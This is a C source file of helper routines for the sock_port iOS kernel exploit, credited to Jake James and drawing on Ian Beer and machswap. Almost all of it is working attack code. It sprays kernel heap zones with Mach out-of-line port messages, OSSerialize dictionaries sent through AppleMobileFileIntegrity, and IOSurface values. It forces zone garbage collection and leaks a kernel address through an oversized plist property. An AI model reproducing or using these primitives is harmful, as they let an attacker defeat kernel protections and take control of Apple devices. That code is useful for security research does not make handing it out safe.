//
//  exploit_utilities.c
//  sock_port
//
//  Created by Jake James on 7/17/19.
//  Copyright Â© 2019 Jake James. All rights reserved.
//

#include "exploit_utilities.h"

// from Ian Beer. make a kernel allocation with the kernel address of 'target_port', 'count' times
mach_port_t fill_kalloc_with_port_pointer(mach_port_t target_port, int count, int disposition) {
    mach_port_t q = MACH_PORT_NULL;
    kern_return_t err;
    err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &q);
    if (err != KERN_SUCCESS) {
        printf("[-] failed to allocate port\n");
        return 0;
    }
    
    mach_port_t* ports = malloc(sizeof(mach_port_t) * count);
    for (int i = 0; i < count; i++) {
        ports[i] = target_port;
    }
    
    struct ool_msg* msg = (struct ool_msg*)calloc(1, sizeof(struct ool_msg));
    
    msg->hdr.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
    msg->hdr.msgh_size = (mach_msg_size_t)sizeof(struct ool_msg);
    msg->hdr.msgh_remote_port = q;
    msg->hdr.msgh_local_port = MACH_PORT_NULL;
    msg->hdr.msgh_id = 0x41414141;
    
    msg->body.msgh_descriptor_count = 1;
    
    msg->ool_ports.address = ports;
    msg->ool_ports.count = count;
    msg->ool_ports.deallocate = 0;
    msg->ool_ports.disposition = disposition;
    msg->ool_ports.type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
    msg->ool_ports.copy = MACH_MSG_PHYSICAL_COPY;
    
    err = mach_msg(&msg->hdr,
                   MACH_SEND_MSG|MACH_MSG_OPTION_NONE,
                   msg->hdr.msgh_size,
                   0,
                   MACH_PORT_NULL,
                   MACH_MSG_TIMEOUT_NONE,
                   MACH_PORT_NULL);
    
    if (err != KERN_SUCCESS) {
        printf("[-] failed to send message: %s\n", mach_error_string(err));
        return MACH_PORT_NULL;
    }
    
    return q;
}

// Ian Beer
size_t message_size_for_kalloc_size(size_t kalloc_size) {
    return ((3 * kalloc_size) / 4) - 0x74;
}

// Ian Beer
mach_port_t send_kalloc_message(uint8_t *replacer_message_body, uint32_t replacer_body_size) {
    mach_port_t q = MACH_PORT_NULL;
    kern_return_t err;
    err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &q);
    if (err != KERN_SUCCESS) {
        printf("[-] failed to allocate port\n");
        return MACH_PORT_NULL;
    }
    
    mach_port_limits_t limits = {0};
    limits.mpl_qlimit = MACH_PORT_QLIMIT_LARGE;
    err = mach_port_set_attributes(mach_task_self(),
                                   q,
                                   MACH_PORT_LIMITS_INFO,
                                   (mach_port_info_t)&limits,
                                   MACH_PORT_LIMITS_INFO_COUNT);
    if (err != KERN_SUCCESS) {
        printf("[-] failed to increase queue limit\n");
        return MACH_PORT_NULL;
    }
    
    mach_msg_size_t msg_size = sizeof(struct simple_msg) + replacer_body_size;
    struct simple_msg *msg = (struct simple_msg *)malloc(msg_size);
    memset(msg, 0, sizeof(struct simple_msg));
    memcpy(&msg->buf[0], replacer_message_body, replacer_body_size);
    
    for (int i = 0; i < 256; i++) {
        msg->hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
        msg->hdr.msgh_size = msg_size;
        msg->hdr.msgh_remote_port = q;
        msg->hdr.msgh_local_port = MACH_PORT_NULL;
        msg->hdr.msgh_id = 0x41414142;
        
        err = mach_msg(&msg->hdr,
                       MACH_SEND_MSG|MACH_MSG_OPTION_NONE,
                       msg_size,
                       0,
                       MACH_PORT_NULL,
                       MACH_MSG_TIMEOUT_NONE,
                       MACH_PORT_NULL);
        
        if (err != KERN_SUCCESS) {
            printf("[-] failed to send message %x (%d): %s\n", err, i, mach_error_string(err));
            return MACH_PORT_NULL;
        }
    }
    
    return q;
}

#ifdef __LP64__
/* Routine io_service_open_extended */
#ifndef    mig_external
#define mig_external
#endif    /* mig_external */

#ifndef    __DeclareSendRpc
#define    __DeclareSendRpc(_NUM_, _NAME_)
#endif    /* __DeclareSendRpc */

#ifndef    __BeforeSendRpc
#define    __BeforeSendRpc(_NUM_, _NAME_)
#endif    /* __BeforeSendRpc */

#ifndef    __AfterSendRpc
#define    __AfterSendRpc(_NUM_, _NAME_)
#endif    /* __AfterSendRpc */

#define msgh_request_port    msgh_remote_port
#define msgh_reply_port        msgh_local_port

#ifndef    __MachMsgErrorWithoutTimeout
#define    __MachMsgErrorWithoutTimeout(_R_) { \
    switch (_R_) { \
    case MACH_SEND_INVALID_DATA: \
    case MACH_SEND_INVALID_DEST: \
    case MACH_SEND_INVALID_HEADER: \
        mig_put_reply_port(InP->Head.msgh_reply_port); \
        break; \
    default: \
        mig_dealloc_reply_port(InP->Head.msgh_reply_port); \
    } \
}
#endif    /* __MachMsgErrorWithoutTimeout */

mig_external kern_return_t io_service_open_extended(mach_port_t service,
                                                    task_t owningTask,
                                                    uint32_t connect_type,
                                                    NDR_record_t ndr,
                                                    io_buf_ptr_t properties,
                                                    mach_msg_type_number_t propertiesCnt,
                                                    kern_return_t *result,
                                                    mach_port_t *connection)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
    typedef struct {
        mach_msg_header_t Head;
        /* start of the kernel processed data */
        mach_msg_body_t msgh_body;
        mach_msg_port_descriptor_t owningTask;
        mach_msg_ool_descriptor_t properties;
        /* end of the kernel processed data */
        NDR_record_t NDR;
        uint32_t connect_type;
        NDR_record_t ndr;
        mach_msg_type_number_t propertiesCnt;
    } Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
    typedef struct {
        mach_msg_header_t Head;
        /* start of the kernel processed data */
        mach_msg_body_t msgh_body;
        mach_msg_port_descriptor_t connection;
        /* end of the kernel processed data */
        NDR_record_t NDR;
        kern_return_t result;
        mach_msg_trailer_t trailer;
    } Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
    typedef struct {
        mach_msg_header_t Head;
        /* start of the kernel processed data */
        mach_msg_body_t msgh_body;
        mach_msg_port_descriptor_t connection;
        /* end of the kernel processed data */
        NDR_record_t NDR;
        kern_return_t result;
    } __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
    /*
     * typedef struct {
     *     mach_msg_header_t Head;
     *     NDR_record_t NDR;
     *     kern_return_t RetCode;
     * } mig_reply_error_t;
     */

    union {
        Request In;
        Reply Out;
    } Mess;

    Request *InP = &Mess.In;
    Reply *Out0P = &Mess.Out;

    mach_msg_return_t msg_result;

#ifdef    __MIG_check__Reply__io_service_open_extended_t__defined
    kern_return_t check_result;
#endif    /* __MIG_check__Reply__io_service_open_extended_t__defined */

    __DeclareSendRpc(2862, "io_service_open_extended")

#if    UseStaticTemplates
    const static mach_msg_port_descriptor_t owningTaskTemplate = {
        /* name = */        MACH_PORT_NULL,
        /* pad1 = */        0,
        /* pad2 = */        0,
        /* disp = */        19,
        /* type = */        MACH_MSG_PORT_DESCRIPTOR,
    };
#endif    /* UseStaticTemplates */

#if    UseStaticTemplates
    const static mach_msg_ool_descriptor_t propertiesTemplate = {
        /* addr = */        (void *)0,
        /* size = */        0,
        /* deal = */        FALSE,
        /* copy = */        MACH_MSG_PHYSICAL_COPY,
        /* pad2 = */        0,
        /* type = */        MACH_MSG_OOL_DESCRIPTOR,
    };
#endif    /* UseStaticTemplates */

    InP->msgh_body.msgh_descriptor_count = 2;
#if    UseStaticTemplates
    InP->owningTask = owningTaskTemplate;
    InP->owningTask.name = owningTask;
#else    /* UseStaticTemplates */
    InP->owningTask.name = owningTask;
    InP->owningTask.disposition = 19;
    InP->owningTask.type = MACH_MSG_PORT_DESCRIPTOR;
#endif    /* UseStaticTemplates */

#if    UseStaticTemplates
    InP->properties = propertiesTemplate;
    InP->properties.address = (void *)(properties);
    InP->properties.size = propertiesCnt;
#else    /* UseStaticTemplates */
    InP->properties.address = (void *)(properties);
    InP->properties.size = propertiesCnt;
    InP->properties.deallocate =  FALSE;
    InP->properties.copy = MACH_MSG_PHYSICAL_COPY;
    InP->properties.type = MACH_MSG_OOL_DESCRIPTOR;
#endif    /* UseStaticTemplates */

    InP->NDR = NDR_record;

    InP->connect_type = connect_type;

    InP->ndr = ndr;

    InP->propertiesCnt = propertiesCnt;

    InP->Head.msgh_reply_port = mig_get_reply_port();
    InP->Head.msgh_bits = MACH_MSGH_BITS_COMPLEX|
        MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
    /* msgh_size passed as argument */
    InP->Head.msgh_request_port = service;
    InP->Head.msgh_id = 2862;
    InP->Head.msgh_reserved = 0;
    
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
    if (voucher_mach_msg_set != NULL) {
        voucher_mach_msg_set(&InP->Head);
    }
#endif // USING_VOUCHERS
    
/* END VOUCHER CODE */

    __BeforeSendRpc(2862, "io_service_open_extended")
    msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    __AfterSendRpc(2862, "io_service_open_extended")
    if (msg_result != MACH_MSG_SUCCESS) {
        __MachMsgErrorWithoutTimeout(msg_result);
    }
    if (msg_result != MACH_MSG_SUCCESS) {
        { return msg_result; }
    }


#if    defined(__MIG_check__Reply__io_service_open_extended_t__defined)
    check_result = __MIG_check__Reply__io_service_open_extended_t((__Reply__io_service_open_extended_t *)Out0P);
    if (check_result != MACH_MSG_SUCCESS) {
        mach_msg_destroy(&Out0P->Head);
        { return check_result; }
    }
#endif    /* defined(__MIG_check__Reply__io_service_open_extended_t__defined) */

    *result = Out0P->result;

    *connection = Out0P->connection.name;
    return KERN_SUCCESS;
}
#else
extern kern_return_t io_service_open_extended(mach_port_t               service,
                                              task_t                    owningTask,
                                              uint32_t                  connect_type,
                                              NDR_record_t              ndr,
                                              io_buf_ptr_t              properties,
                                              mach_msg_type_number_t    propertiesCnt,
                                              kern_return_t             *result,
                                              mach_port_t               *connection);
#endif

io_service_t _io_get_service(void* servicename)
{
    io_service_t service = MACH_PORT_NULL;
    service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching(servicename));
    if(!MACH_PORT_VALID(service))
    {
        printf("[-] Failed to get IO service handle (port = 0x%08x)\n", service);
        return -1;
    }
    return service;
}

mach_port_t _io_get_userclient(io_service_t svc)
{
    mach_port_t uc = MACH_PORT_NULL;
    printf("[i] Preparing userclient...\n");
    kern_return_t ret = IOServiceOpen(svc, mach_task_self(), 0, &uc);
    if(ret != KERN_SUCCESS)
    {
        printf("[-] Failed to prepare userclient! \n");
        return -1;
    }
    return uc;
}

io_connect_t _io_spawn_client(void *dict, size_t dictlen)
{
    //printf("[i] Spawning user client / Parsing dictionary...\n");
    io_connect_t client = MACH_PORT_NULL;
    kern_return_t err;
    kern_return_t ret = io_service_open_extended(_io_get_service("AppleMobileFileIntegrity"), mach_task_self(), 0, NDR_record, dict, (mach_msg_type_number_t)dictlen, &err, &client);
    if(ret != KERN_SUCCESS || err != KERN_SUCCESS || !MACH_PORT_VALID(client))
    {
        printf("[-] Failed to parse dictionary (client = 0x%08x, ret = %u: %s, err = %u: %s)\n", client, ret, mach_error_string(ret), err, mach_error_string(err));
    }
    return client;
}

void spray_OSSerialize(void* data, size_t size)
{
    /* struct with the first element removed
     8 bytes misaligned
     somehow, this makes minmtu show up properly
     but pktinfo shouldn't be correct?
     check pktopts def for alignment */
    
    // 192 bytes array if you want to check where stuff goes
    // ip6_pktopts is 192 bytes on 64 bits, 136 on 32 bits
    // both go into kalloc.192
    
    // anyway, it is off 8 bytes, so add 8 bytes.
    int cnt = 0;
    int dict_sz = (int)size + (6 * sizeof(uint32_t)) + 8/* haxx */;
    uint32_t* dictz = calloc(1, dict_sz);
    dictz[cnt++] = kOSSerializeMagic;
    dictz[cnt++] = kOSSerializeDictionary | kOSSerializeEndCollection | 0x2;
    dictz[cnt++] = kOSSerializeSymbol | 0x4;
    dictz[cnt++] = 0x00424242;
    dictz[cnt++] = kOSSerializeData | (uint32_t)size | kOSSerializeEndCollection;
    dictz[cnt++] = 0x0; /* haxx */
    dictz[cnt++] = 0x0; /* haxx */
    memcpy(dictz + 5 + 2/* haxx */, data, size);
    
    _io_spawn_client(dictz, dict_sz);
    
    return;
}

int get_kernel_anchor(addr_t *anchor)
{
    io_iterator_t it = MACH_PORT_NULL;
    io_object_t o = MACH_PORT_NULL;
    kern_return_t ret;
    
    const char xml[] = "<plist><dict><key>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</key><integer size=\"512\">1768515945</integer></dict></plist>";
    
    _io_spawn_client((char*)xml, sizeof(xml));
    
    IORegistryEntryGetChildIterator(_io_get_service("AppleMobileFileIntegrity"), "IOService", &it);
    
    bool found = false;
    while((o = IOIteratorNext(it)) != MACH_PORT_NULL && !found)
    {
        uintptr_t buf[16];
        uint32_t size = (uint32_t)sizeof(buf);
        ret = IORegistryEntryGetProperty(o, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", (char*)buf, &size);
        if(ret == KERN_SUCCESS)
        {
#ifdef __LP64__
            *anchor = buf[1];
#else
            *anchor = buf[9];
#endif
            return 0;
        }
        IOObjectRelease(o);
        o = MACH_PORT_NULL;
    }
    return -1;
}

// rest is from machswap
void trigger_gc(void) {
    const int gc_ports_cnt = 100;
    int gc_ports_max = gc_ports_cnt;
    mach_port_t gc_ports[gc_ports_cnt] = { 0 };
    
    uint32_t body_size = (uint32_t)message_size_for_kalloc_size(16384) - sizeof(mach_msg_header_t); // 1024
    uint8_t *body = (uint8_t*)malloc(body_size);
    memset(body, 0x41, body_size);
    
    for (int i = 0; i < gc_ports_cnt; i++) {
        uint64_t t0, t1;
        
        t0 = mach_absolute_time();
        gc_ports[i] = send_kalloc_message(body, body_size);
        t1 = mach_absolute_time();
        
        if (t1 - t0 > 1000000) {
            printf("[+] got gc at %d -- breaking\n", i);
            gc_ports_max = i;
            break;
        }
    }
    
    for (int i = 0; i < gc_ports_max; i++) {
        mach_port_destroy(mach_task_self(), gc_ports[i]);
    }
    
    sched_yield();
    sleep(1);
}

mach_vm_size_t pagesize = 0;

const uint64_t IOSURFACE_CREATE_SURFACE =  0;
const uint64_t IOSURFACE_SET_VALUE      =  9;
const uint64_t IOSURFACE_GET_VALUE      = 10;
const uint64_t IOSURFACE_DELETE_VALUE   = 11;

int init_IOSurface(void) {
    kern_return_t ret = KERN_SUCCESS;

    ret = _host_page_size(mach_host_self(), (vm_size_t*)&pagesize);
    printf("[i] page size: 0x%llx, %s\n", pagesize, mach_error_string(ret));
    if (ret != KERN_SUCCESS) {
        printf("[-] failed to get page size! ret: %x %s\n", ret, mach_error_string(ret));
        return ret;
    }
    return !IOSurface_init();
}

void deinit_IOSurface(void) {
    IOSurface_deinit();
}

int spray_IOSurface(void *data, size_t size) {
    return !IOSurface_spray_with_gc(32, 256, data, (uint32_t)size, NULL);
}
